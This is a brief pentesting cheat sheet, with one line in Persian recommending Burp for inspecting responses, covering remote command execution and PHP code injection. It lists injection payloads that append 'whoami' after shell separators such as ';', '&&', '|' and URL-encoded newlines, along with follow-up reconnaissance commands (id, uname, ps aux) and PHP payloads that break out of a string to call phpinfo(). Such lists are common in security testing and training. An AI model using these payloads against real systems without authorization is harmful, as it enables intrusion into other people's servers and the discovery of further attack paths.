# Remote Command Execution

## Concept
- باید از Burp برای بررسی Response استفاده کنیم


## Payloads
```
;whoami
;%20whoami
&whoami
&&whoami
|whoami
||whoami
%0Awhoami
```

## Useful commands
- ```pwd```
- ```uname```
- ```id```
- ```hostname```
- ```ps aux```

# Code Execution

## Payload
```
a";phpinfo();//
a".phpinfo();//
a);}phpinfo();//
```

## Sample PHP executable
- https://www.php.net/manual/en/function.shell-exec.php

